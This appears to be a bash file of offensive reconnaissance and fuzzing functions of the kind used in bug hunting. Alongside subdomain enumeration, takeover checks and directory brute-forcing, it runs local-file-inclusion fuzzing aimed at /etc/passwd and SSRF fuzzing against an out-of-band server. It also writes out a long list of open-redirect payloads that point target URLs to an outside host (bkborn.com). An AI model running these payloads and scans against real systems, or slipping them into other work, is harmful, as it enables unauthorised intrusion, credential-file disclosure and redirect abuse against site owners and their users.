fileinclusion(){
target=$1
ffuf -w "$target:URL" -w /root/resource/payload/lfi-etcpasswd -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" \
-mc 200 -o fileinclusion-temp1

gron fileinclusion-temp1 | tee fileinclusion-temp2
cat fileinclusion-temp2 | egrep -v "input |position|redirectlocation|resultfile|status| \{\}|url |lines|words|time|config|commandline" | \
tee $2
sed -e 's/json.results//g; s/;//g; ; s/"//g; s/input.//g; s/.URL =/\tUrl    =/g; s/.FUZZ =/\tFuzz   =/g; s/.length =/\tLength =/g' \
-i $2; rm fileinclusion-temp[1-2];
}

ssrf(){
cp /root/resource/src/oobserver .;
sed -i "s/target/$1/g" oobserver
target=./interest/fuzz-ssrf
ffuf -w "$target:URL" -w oobserver -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
}

openredirectgen(){
echo "http://$1.bkborn.com
https://$1.bkborn.com@google.com/%2f..
https://$1/http://$1.bkborn.com
http://$1.bkborn.com?q=https://google.com/
http://$1.bkborn.com\www.$1
localhost.$1.bkborn.com
//$1.bkborn.com
///$1.bkborn.com
\/$1.bkborn.com
/\/\/$1.bkborn.com
/%09/$1.bkborn.com
/$1.bkborn.com
//$1.bkborn.com@google.com/%2f..
///$1.bkborn.com@google.com/%2f..
/https://$1.bkborn.com@google.com/%2f..
//$1.bkborn.com@google.com/%2f%2e%2e
///$1.bkborn.com@google.com/%2f%2e%2e
////google.com/%2f%2e%2e$1
/http://$1.bkborn.com
/http:/$1.bkborn.com
/https:/%5c$1.bkborn.com/
/https://%09/$1.bkborn.com
/https://%5c$1.bkborn.com
/https:///$1.bkborn.com/%2e%2e
/https:///$1.bkborn.com/%2f%2e%2e
/https://$1.bkborn.com
/https://$1.bkborn.com/
/https://$1.bkborn.com/%2e%2e
/https://$1.bkborn.com/%2e%2e%2f
/https://$1.bkborn.com/%2f%2e%2e
/https://$1.bkborn.com/%2f..
/https://$1.bkborn.com//
/https:$1.bkborn.com
/%09/$1.bkborn.com
/%2f%2f$1.bkborn.com
/%5c$1.bkborn.com
/.$1.bkborn.com
//%09/$1.bkborn.com
//%5c$1.bkborn.com
///%09/$1.bkborn.com
///%5c$1.bkborn.com
////%09/$1.bkborn.com
////%5c$1.bkborn.com
/////$1.bkborn.com
/////$1.bkborn.com/
////\;@$1.bkborn.com
////$1.bkborn.com/"> oobserver
}

subcount(){
tr -c '[:alnum:]' '[\n*]' < $1 | sort | uniq -c | sort -nr | head  -10
}

sudomyy(){
cd /root/sudomy;
./sudomy -d $1 --no-probe
}

projectdiscovery(){
curl  https://chaos-data.projectdiscovery.io/index.json |jq '.[] .URL'| xargs wget -nv && find -name '*.zip' -exec \
sh -c 'unzip -o -qq -d "${1%.*}" "$1"' _ {} \; && rm -rf *.zip
}

subdomain-takeover(){
dnsprobe -l $1 -r CNAME | tee dnsprobe.txt; \
subjack -w dnsprobe.txt -timeout 30 -ssl -o subjack-output.txt -c /root/resource/src/subjack-fingerprints.json -v 3; \ 
cat subjack-output.txt | awk '$0 !~ /Not Vulnerable/' | tee subjack-vulnerable.txt 
}

screenshot(){
gowitness file --source=$1 --threads=2 --log-format=json --log-level=warn --timeout=25
}

webarchive(){
read -p 'Target domain : ' domain
curl -s "http://web.archive.org/cdx/search/cdx?url=$domain/*&output=text&fl=original&collapse=urlkey" | grep -P "=" | \
sed "/\b\(jpg\|jpeg\|png\|svg\|pdf\|css\|gif\|woff\|woff2\)\b/d" > output.txt ; \
for i in $(cat output.txt); do URL="${i}"; LIST=(${URL//[=&]/=FUZZ&}); echo ${LIST} | awk -F '=' -vOFS='=' '{$NF="FUZZ"}1;' >> OutputParam.txt ; \
done ; rm output.txt ; sort -u OutputParam.txt > WebArchiveParam.txt ; rm OutputParam.txt
}

wayback(){
cat $1 | waybackurls | sed "/\b\(jpg\|jpeg\|png\|svg\|pdf\|css\|gif\|woff\|woff2\)\b/d" > Waybackurls.txt
}

brute-dir(){
for i in $(cat $1); do  ffuf -u $i/FUZZ -w $2 \
-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
-c -fs 0 -t 10 -mc 200 ; done | tee ahaaaa; 
cat ahaaaa | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee $3; rm ahaaaa;
}


brute-param(){
target=$1;
ffuf -w "$target:URL" -w /root/resource/wordlist/params.txt -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" -mc 200 | \
tee $2;
}


multibuster(){
cat $1 | parallel -j 5 --bar --shuf gobuster dir -u {} -t 50 -w /root/resource/wordlist/dir/dirsearch.txt -l -e -r -k -q | tee $2
}

s3enumGenerate(){
s3enum --wordlist /root/wordlist/s3/wordlist.txt --suffixlist /root/wordlist/s3/suffixlist.txt --threads 10 $1
}

awsbucketls(){
aws s3 ls s3://$1
}

probe(){
cat $1 | httprobe -c 30 -p http:81,8000,8001,8008,8080,8083,8834,8888 -p https:8443,9443 | tee $2
}

asn-check-org(){
amass intel -org $1
}

asn-cidr1(){
whois -h whois.radb.net -- "-i origin $1" | grep -Eo "([0-9.]+){4}/[0-9]+" | head | sort -u
}

asn-cidr2(){
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | cut -d ' ' -f 6 | head -1) | \
grep -w "route:" | awk '{print $NF}' | sort -u
}
